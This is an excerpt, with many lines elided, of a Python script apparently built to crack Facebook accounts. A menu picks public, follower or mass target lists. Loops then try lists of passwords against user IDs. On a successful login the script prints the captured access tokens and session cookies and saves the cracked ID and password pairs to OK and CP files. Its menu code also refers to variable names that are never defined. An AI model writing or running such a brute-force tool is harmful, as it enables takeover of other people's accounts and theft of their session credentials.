...
# author by RASHEDUL ISLAM MANIK
...
def menu():
	...
	elif Rashed == "1" or RASHED == "01":

		publik()

		method()

	elif Rashed == "2" or DADU == "02":

		follower()

		method()

	elif Rashed == "3" or  RASHED == "03":

		massal()

		method()

	elif Umair == "4" or RRASHED == "04":
	...
	elif Rashed == "5" or Rashed == "05":

		setting_ua()

	elif Rashed == "0" or Rashed == "00":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mRASHED PRO/FASTER \033[1;97m]")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[RASHED-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[RASHED-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[RASHED-CP] %s|%s\033[0;92m        "%(uid, pw))

				cp.append("%s|%s"%(uid, pw))

				open("CP/%s.txt"%(tRashed),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[RASHED-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tRashed),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;95m[RASHED-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[RASHED-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[RASHED-CP] %s|%s\033[0;91m        "%(uid, pw))
